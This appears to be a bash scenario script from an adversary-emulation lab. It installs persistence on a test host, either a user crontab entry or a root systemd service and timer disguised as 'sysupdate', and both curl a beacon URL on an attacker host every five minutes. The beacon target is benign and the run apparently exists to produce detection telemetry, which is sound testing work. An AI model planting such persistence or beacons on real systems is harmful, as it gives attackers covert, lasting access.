#!/usr/bin/env bash
# S04 — Persistence via cron or systemd timer on Moria.
# Params: VARIANT (odd=cron, even=systemd timer). Beacon calls back to Barad-dûr.
# The job fires on its own schedule after staging, so the beacon cadence shows
# up in later telemetry, not during this run. See scenarios/S04-persistence.md.
run_scenario() {
  local CB="http://$ATTACKER_IP:$STAGE_HTTP_PORT/b"

  step "stage a benign beacon target on Barad-dûr"
  drop_stage_file "b" "ok"
  serve_stage

  if (( VARIANT % 2 == 1 )); then
    step "variant cron: install a user crontab beacon (every 5 min)"
    on_lin_as "$FOOTHOLD_USER" "cron" \
      "(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s $CB >/dev/null 2>&1') | crontab -"
    note "persistence: user crontab beacon every 5 min → $CB"
  else
    step "variant systemd: install a service + timer (every 5 min)"
    on_lin "systemd-unit" \
      "sudo tee /etc/systemd/system/sysupdate.service >/dev/null <<'S'
[Service]
ExecStart=/usr/bin/curl -s $CB
S
sudo tee /etc/systemd/system/sysupdate.timer >/dev/null <<'T'
[Timer]
OnBootSec=2min
OnUnitActiveSec=5min
[Install]
WantedBy=timers.target
T
sudo systemctl daemon-reload && sudo systemctl enable --now sysupdate.timer"
    note "persistence: systemd timer sysupdate.timer, OnUnitActiveSec=5min → $CB"
  fi

  # Give the beacon one chance to fire during the run so the seal has a timestamp.
  step "trigger one beacon now for a first timestamp"
  on_lin_as "$FOOTHOLD_USER" "first-beacon" "curl -s $CB >/dev/null 2>&1 || true"

  stop_stage
  noise_lin
}
